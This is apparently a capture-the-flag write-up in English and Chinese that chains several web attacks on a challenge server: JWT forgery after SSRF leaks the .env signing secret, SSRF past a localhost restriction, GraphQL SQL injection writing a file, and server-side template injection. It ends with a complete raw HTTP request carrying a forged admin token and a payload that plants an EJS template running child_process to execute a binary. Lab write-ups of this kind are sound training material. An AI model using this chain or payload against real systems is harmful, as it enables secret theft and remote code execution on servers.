### 

1. Generate a JWT token as a guest user.
    
    以访客用户身份生成 JWT 令牌。
    
2. Use SSRF via PDF generation to read system files and leak the `.env` file containing the secret used to sign the JWT tokens.
    
    通过 PDF 生成使用 SSRF 读取系统文件并泄露包含用于签署 JWT 令牌的秘密的 `.env` 文件。
    
3. Forge a JWT admin token to interact with admin functionality at the `/graphql` endpoint.
    
    伪造 JWT 管理令牌以与 `/graphql` 端点的管理功能进行交互。
    
4. Use SSRF to bypass the 127.0.0.1 restriction and interact with the `/graphql` endpoint.
    
    使用 SSRF 绕过 127.0.0.1 限制并与 `/graphql` 端点交互。
    
5. Exploit a GraphQL SQL injection to create a file in the system with a regex bypass.
    
    利用 GraphQL SQL 注入在系统中创建一个带有正则表达式绕过的文件。
    
6. Abuse arbitrary error template creation to exploit a Server-Side Template Injection (SSTI) to execute a binary that will read a flag located in the root directory.
    
    滥用任意错误模板创建来利用服务器端模板注入（SSTI）来执行将读取位于根目录中的标志的二进制文件。

POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MTYzMjA2MDV9.X6hjojsuhpUzPJLS-zsJhgVQp4l2vfT4TklBH6KF4ko HTTP/1.1
Host: 94.237.59.197:32514
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 232

url=http://127.0.0.1:1337/graphql?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MTYzMjA2MDV9.X6hjojsuhpUzPJLS-zsJhgVQp4l2vfT4TklBH6KF4ko%26query={getDataByName(name:"\n'UNION+ALL+SELECT+1,'<%-+global.process.mainModule.require(child_process).spawnSync(/readflag).stdout+%>',null,null+INTO+OUTFILE+'/app/views/errors/404.ejs'--+-"){id+name+department+isPresent}}
